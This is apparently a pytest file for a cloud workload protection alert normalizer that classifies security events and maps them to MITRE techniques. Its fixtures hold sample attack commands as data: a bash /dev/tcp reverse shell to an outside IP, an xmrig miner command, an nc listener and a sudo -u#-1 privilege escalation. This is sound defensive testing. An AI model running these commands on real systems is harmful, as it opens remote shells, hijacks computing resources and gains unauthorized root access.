"""
Tests for CWPP (Cloud Workload Protection
Platform) Normalizer
"""

import pytest
from layer1_ingestion.normalizers.cwpp_normalizer\
    import (
        CWPPNormalizer,
        CWPP_EVENT_RISK,
        CWPP_SEVERITY_RISK,
        CWPP_KEYWORD_MAP,
        CWPP_EVENT_TO_MITRE
    )


@pytest.fixture
def normalizer():
    return CWPPNormalizer()


@pytest.fixture
def prisma_escape():
    return {
        "severity": "CRITICAL",
        "rule": "Container escape attempt detected",
        "hostname": "prod-payment-node-01",
        "containerName": "payment-api",
        "processName": "runc",
        "command": "runc --version exploit",
        "ip": "185.220.101.45",
        "time": "2026-06-01T03:00:00Z"
    }


@pytest.fixture
def prisma_cryptomining():
    return {
        "severity": "HIGH",
        "rule": "Cryptocurrency miner activity detected",
        "hostname": "prod-web-node-04",
        "containerName": "nginx-frontend",
        "processName": "xmrig",
        "command": "xmrig --pool pool.minexmr.com",
        "ip": "10.0.4.12"
    }


@pytest.fixture
def aqua_reverse_shell():
    return {
        "severity": "CRITICAL",
        "control": "Reverse shell connection established",
        "container": "api-gateway",
        "image": "internal/api:latest",
        "process": "bash",
        "cmd": "bash -i >& /dev/tcp/45.142.100.10/4444 0>&1",
        "source_ip": "45.142.100.10"
    }


@pytest.fixture
def falcon_privesc():
    return {
        "severity": 5,
        "detect_name": "Privilege escalation via sudo exploit",
        "hostname": "prod-db-instance-02",
        "instance_id": "i-0abc123def456",
        "filename": "sudo",
        "command_line": "sudo -u#-1 /bin/bash",
        "local_ip": "10.0.2.50"
    }


@pytest.fixture
def aqua_drift():
    return {
        "severity": "MEDIUM",
        "control": "Runtime drift: unexpected binary executed",
        "container": "billing-worker",
        "image": "internal/billing:v2",
        "process": "nc",
        "cmd": "nc -lvnp 8080"
    }


# ============================================================
# INITIALIZATION
# ============================================================

class TestInitialization:

    def test_normalizer_initializes(self, normalizer):
        assert normalizer is not None
        assert normalizer.source_system == "cwpp"

    def test_event_risk_map_populated(self):
        assert len(CWPP_EVENT_RISK) > 0
        assert "container_escape" in CWPP_EVENT_RISK

    def test_severity_map_populated(self):
        assert "CRITICAL" in CWPP_SEVERITY_RISK
        assert CWPP_SEVERITY_RISK["CRITICAL"] > (
            CWPP_SEVERITY_RISK["LOW"]
        )

    def test_keyword_map_populated(self):
        assert len(CWPP_KEYWORD_MAP) > 0
        assert "escape" in CWPP_KEYWORD_MAP

    def test_mitre_map_populated(self):
        assert "container_escape" in (
            CWPP_EVENT_TO_MITRE
        )
        assert CWPP_EVENT_TO_MITRE[
            "container_escape"
        ] == "T1611"


# ============================================================
# PRISMA CLOUD COMPUTE
# ============================================================

class TestPrismaNormalization:

    def test_returns_dict(
        self, normalizer, prisma_escape
    ):
        result = normalizer.normalize(prisma_escape)
        assert isinstance(result, dict)

    def test_escape_classified(
        self, normalizer, prisma_escape
    ):
        result = normalizer.normalize(prisma_escape)
        assert result["cwpp_event_type"] == (
            "container_escape"
        )

    def test_escape_critical_risk(
        self, normalizer, prisma_escape
    ):
        result = normalizer.normalize(prisma_escape)
        assert result["risk_score"] >= 0.95

    def test_escape_mitre_t1611(
        self, normalizer, prisma_escape
    ):
        result = normalizer.normalize(prisma_escape)
        assert result["mitre_technique"] == "T1611"

    def test_escape_reason_present(
        self, normalizer, prisma_escape
    ):
        result = normalizer.normalize(prisma_escape)
        assert "workload_escape_attempt" in (
            result["risk_reasons"]
        )

    def test_tor_ip_flagged(
        self, normalizer, prisma_escape
    ):
        result = normalizer.normalize(prisma_escape)
        assert "tor_exit_node_src" in (
            result["risk_reasons"]
        )

    def test_vendor_tagged(
        self, normalizer, prisma_escape
    ):
        result = normalizer.normalize(prisma_escape)
        assert result["cwpp_vendor"] == (
            "prisma_cloud_compute"
        )
        assert result["source_system"] == (
            "cwpp_prisma_cloud_compute"
        )

    def test_workload_captured(
        self, normalizer, prisma_escape
    ):
        result = normalizer.normalize(prisma_escape)
        assert result["data_store_name"] == (
            "prod-payment-node-01"
        )

    def test_cryptomining_classified(
        self, normalizer, prisma_cryptomining
    ):
        result = normalizer.normalize(
            prisma_cryptomining
        )
        assert result["cwpp_event_type"] == (
            "cryptomining"
        )

    def test_cryptomining_risk(
        self, normalizer, prisma_cryptomining
    ):
        result = normalizer.normalize(
            prisma_cryptomining
        )
        assert result["risk_score"] >= 0.82
        assert "cryptomining_detected" in (
            result["risk_reasons"]
        )

    def test_cryptomining_mitre_t1496(
        self, normalizer, prisma_cryptomining
    ):
        result = normalizer.normalize(
            prisma_cryptomining
        )
        assert result["mitre_technique"] == "T1496"


# ============================================================
# AQUA SECURITY
# ============================================================

class TestAquaNormalization:

    def test_returns_dict(
        self, normalizer, aqua_reverse_shell
    ):
        result = normalizer.normalize_aqua(
            aqua_reverse_shell
        )
        assert isinstance(result, dict)

    def test_reverse_shell_classified(
        self, normalizer, aqua_reverse_shell
    ):
        result = normalizer.normalize_aqua(
            aqua_reverse_shell
        )
        assert result["cwpp_event_type"] == (
            "reverse_shell"
        )

    def test_reverse_shell_risk(
        self, normalizer, aqua_reverse_shell
    ):
        result = normalizer.normalize_aqua(
            aqua_reverse_shell
        )
        assert result["risk_score"] >= 0.90
        assert "reverse_shell_spawned" in (
            result["risk_reasons"]
        )

    def test_reverse_shell_mitre(
        self, normalizer, aqua_reverse_shell
    ):
        result = normalizer.normalize_aqua(
            aqua_reverse_shell
        )
        assert result["mitre_technique"] == "T1059"

    def test_aqua_vendor_tagged(
        self, normalizer, aqua_reverse_shell
    ):
        result = normalizer.normalize_aqua(
            aqua_reverse_shell
        )
        assert result["cwpp_vendor"] == (
            "aqua_security"
        )

    def test_drift_classified(
        self, normalizer, aqua_drift
    ):
        result = normalizer.normalize_aqua(
            aqua_drift
        )
        assert result["cwpp_event_type"] == (
            "runtime_drift"
        )

    def test_drift_mitre_t1525(
        self, normalizer, aqua_drift
    ):
        result = normalizer.normalize_aqua(
            aqua_drift
        )
        assert result["mitre_technique"] == "T1525"


# ============================================================
# CROWDSTRIKE FALCON CWP
# ============================================================

class TestFalconNormalization:

    def test_returns_dict(
        self, normalizer, falcon_privesc
    ):
        result = normalizer.normalize_falcon_cwp(
            falcon_privesc
        )
        assert isinstance(result, dict)

    def test_privesc_classified(
        self, normalizer, falcon_privesc
    ):
        result = normalizer.normalize_falcon_cwp(
            falcon_privesc
        )
        assert result["cwpp_event_type"] == (
            "privilege_escalation"
        )

    def test_privesc_risk(
        self, normalizer, falcon_privesc
    ):
        result = normalizer.normalize_falcon_cwp(
            falcon_privesc
        )
        assert result["risk_score"] >= 0.85

    def test_privesc_mitre_t1068(
        self, normalizer, falcon_privesc
    ):
        result = normalizer.normalize_falcon_cwp(
            falcon_privesc
        )
        assert result["mitre_technique"] == "T1068"

    def test_falcon_numeric_severity_mapped(
        self, normalizer, falcon_privesc
    ):
        result = normalizer.normalize_falcon_cwp(
            falcon_privesc
        )
        assert result["cwpp_severity"] == "CRITICAL"

    def test_falcon_vendor_tagged(
        self, normalizer, falcon_privesc
    ):
        result = normalizer.normalize_falcon_cwp(
            falcon_privesc
        )
        assert result["cwpp_vendor"] == (
            "crowdstrike_falcon_cwp"
        )


# ============================================================
# EDGE CASES
# ============================================================

class TestEdgeCases:

    def test_empty_event_normalize(self, normalizer):
        result = normalizer.normalize({})
        assert result["accessor_identity"] == (
            "unknown"
        )
        assert result["risk_score"] == 0.0

    def test_none_event_normalize(self, normalizer):
        result = normalizer.normalize(None)
        assert result["source_system"] == "cwpp"

    def test_empty_aqua(self, normalizer):
        result = normalizer.normalize_aqua({})
        assert result["risk_score"] == 0.0

    def test_empty_falcon(self, normalizer):
        result = normalizer.normalize_falcon_cwp({})
        assert result["risk_score"] == 0.0

    def test_unknown_rule_defaults(
        self, normalizer
    ):
        result = normalizer.normalize({
            "severity": "LOW",
            "rule": "some benign informational note",
            "hostname": "test-host"
        })
        assert result["cwpp_event_type"] == (
            "policy_violation"
        )

    def test_risk_never_exceeds_one(
        self, normalizer, prisma_escape
    ):
        result = normalizer.normalize(prisma_escape)
        assert result["risk_score"] <= 1.0

    def test_accessor_type_is_workload(
        self, normalizer, prisma_cryptomining
    ):
        result = normalizer.normalize(
            prisma_cryptomining
        )
        assert result["accessor_type"] == "workload"

    def test_event_time_present(
        self, normalizer, aqua_drift
    ):
        result = normalizer.normalize_aqua(
            aqua_drift
        )
        assert result["event_time"] != ""

    def test_raw_event_preserved(
        self, normalizer, prisma_escape
    ):
        result = normalizer.normalize(prisma_escape)
        assert result["raw_event"] == prisma_escape


# ============================================================
# CLASSIFICATION LOGIC
# ============================================================

class TestClassification:

    def test_classify_escape(self, normalizer):
        assert normalizer._classify_event(
            "Container escape detected"
        ) == "container_escape"

    def test_classify_crypto(self, normalizer):
        assert normalizer._classify_event(
            "crypto miner found"
        ) == "cryptomining"

    def test_classify_lateral(self, normalizer):
        assert normalizer._classify_event(
            "lateral movement observed"
        ) == "lateral_movement"

    def test_classify_exfil(self, normalizer):
        assert normalizer._classify_event(
            "data exfiltration to external host"
        ) == "data_exfiltration"

    def test_classify_empty(self, normalizer):
        assert normalizer._classify_event(
            ""
        ) == "unknown"

    def test_classify_unmatched(self, normalizer):
        assert normalizer._classify_event(
            "routine health check passed"
        ) == "policy_violation"